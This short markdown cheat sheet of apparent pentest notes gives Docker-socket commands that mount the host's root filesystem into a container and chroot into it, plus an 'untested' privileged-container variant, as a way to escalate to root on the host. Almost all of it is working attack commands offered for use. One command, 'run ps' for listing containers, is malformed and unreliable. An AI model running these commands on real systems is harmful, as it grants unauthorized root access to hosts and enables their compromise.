```shell-session
$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Mounting the host root to docker 
list images
```
docker image list
```



list containers
```
docker -H /run/docker.socket run ps
```

create and use container to mount host's root to docker
```
docker -H unix:///run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

untested: 
create a container from an image
```
`docker -H unix:///run/docker.sock run -it --privileged -v /:/hostsystem ubuntu /bin/bash`
```